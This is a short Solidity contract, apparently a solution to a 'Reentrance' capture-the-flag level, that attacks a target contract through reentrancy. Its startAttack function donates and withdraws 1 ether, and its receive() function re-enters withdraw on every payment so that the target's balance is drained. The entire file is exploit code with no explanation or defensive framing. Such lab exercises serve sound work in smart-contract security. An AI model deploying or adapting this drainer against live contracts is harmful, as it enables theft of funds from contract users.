// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import { Reentrance } from "../../src/Reentrance/Reentrance.sol";


contract ReentrancyAttack {
    Reentrance reentrance;

    constructor(address _reentrance) {
        reentrance = Reentrance(payable(_reentrance));
    }

    function startAttack() public {
        reentrance.donate{value: 1 ether}(address(this));
        reentrance.withdraw(1 ether);
    }

    receive() external payable {
        reentrance.withdraw(1 ether);
    }
}